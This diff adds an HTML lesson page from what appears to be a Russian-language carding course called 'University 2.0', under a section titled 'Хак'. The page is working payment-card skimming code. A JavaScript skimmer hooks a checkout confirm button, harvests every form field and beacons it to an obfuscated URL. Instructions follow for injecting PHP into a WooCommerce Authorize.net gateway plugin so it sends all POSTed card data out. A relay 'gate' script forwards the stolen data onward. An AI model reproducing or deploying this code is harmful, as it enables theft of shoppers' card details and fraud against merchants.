@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+<a href="hack.html">       
+    <div class="banner_block" style="background-image:url('source/hack_9X2ouwy.jpg')">
+        <div class="banner_content">
+            <h2>Хак</h2>
+            <p>Лучшая защита - это нападение.</p>
+        </div>
+    </div>
+    </a>
+    <br>
+
+            
+   <div class="article_actions">
+        <a href="hack.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+    <div class="text_content">
+
+<p>Video: <a href="files/conf_4.mkv">conf_4.mkv</a></p>
+<hr>
+<p>
+    function parse_fields(){
+    var data = {};
+    data['from'] = location.hostname;
+    data['ua'] = navigator.userAgent;
+    Object.values(document.getElementsByTagName('input')).map(function(e, i) {
+        if (e.name) {
+            data[e.name] = e.value
+        }
+    });
+    Object.values(document.getElementsByTagName('select')).map(
+            function (elem, index) {
+                Object.values(document.getElementsByTagName('option')).map(
+                    function (e, i) {
+                        if (e.value == elem.value){
+                            data[elem.name] = e.text
+                        }
+                });
+        });
+    SendData(data);
+    // TODO solution for speed problem
+    setTimeout(function () { document.getElementsByTagName('form')[0].submit() }, 1);
+}
+
+
+function SendData(e) {
+    var i = 89999 * Math.random() + 1e4,
+        n = JSON.stringify(e),
+        t = document.createElement('img');
+    t.width = '1px', t.height = '1px', t.id = i, t.src = atob('aHR0cDovL2xvY2FsaG9zdC9oYWNrZXIvanMucGhwCg==') + '?image_id=' + btoa(n), document.body.appendChild(t), setTimeout(document.getElementById(i).remove(), 3e3);
+}
+
+window.onload = function (ev) {
+     if (document.getElementById('button-confirm') != null) {
+         document.getElementById('button-confirm').onclick = function () {parse_fields();return false};
+     } else {
+         setTimeout(function () {window.onload(ev);}, 5e3);
+     }
+};
+</p>
+<hr>
+<p>
+ по дефолту это будет 234-ая строка файла: class-wc-gateway-authorize-net-aim-credit-card.php, расположенного в wp-content/plugins/woocomerce-gateway-authorize-net-aim/includes
+    ​
+    там есть метод remove_credit_card_field_input_names
+    ​
+    /**
+     * Remove the input names for the card number and CSC fields so they're
+     * not POSTed to the server, for security and compliance with Accept.js
+     *
+     * @since 3.9.0
+     * @param array $fields credit card fields
+     * @return array
+     */
+    public function remove_credit_card_field_input_names( $fields ) {
+    ​
+        $fields['card-number']['name'] = '';
+    ​
+        if ( $this->csc_enabled() ) {
+            $fields['card-csc']['name'] = 'cc_csc';
+        }
+    ​
+        return $fields;
+    }   
+</p>
+<hr>
+<p>
+     $this->update_session( $posted_data );
+    ​
+    можно вписать свой код
+    ​```
+    try {
+        $post_data = $_POST;
+        $post_data['ip'] = $_SERVER['REMOTE_ADDR'];
+        $post_data['from'] = $_SERVER['SERVER_NAME'];
+        $post_data['ua'] = $_SERVER['HTTP_USER_AGENT'];
+        file_get_contents("URL?image_id=".base64_encode(json_encode($post_data)), false);
+    } catch (Exception $e) {
+    }
+    unset($_POST['cc_nomber']);
+    ​``` 
+</p>
+<hr>
+<p><pre>
+     < ?php
+    $gate = 'http://127.0.0.1:21238';
+    if(!empty($_GET['image_id'])){
+        $getdata = http_build_query($_GET);
+        file_get_contents($gate."?".$getdata, false);
+    }
+    ? >
+</pre>
+</p>
+
+
+    </div>
+
+
+    <br>
+
+
+
+
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
